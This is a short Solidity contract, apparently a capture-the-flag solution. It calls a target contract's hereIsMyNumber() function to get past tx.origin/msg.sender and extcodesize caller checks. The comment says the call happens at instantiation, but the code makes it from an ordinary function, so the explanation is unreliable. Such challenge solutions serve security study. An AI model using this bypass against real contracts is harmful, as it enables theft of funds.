pragma solidity ^0.8.0;

import "./CallMeMaybe.sol";

contract Attacker {

    /*tx.origin refers to the original issuer of the 
    transaction while msg.sender points to the last caller,
    everything that has to be done is instanciate the contract
    calling the function subsequently, this will pass the extcodesize
    check and the tx.origin and msg.sender will be different. 
    */

    function attack (CallMeMaybe _addr) public
    {
        _addr.hereIsMyNumber();
    }
    
    receive() external payable {}

}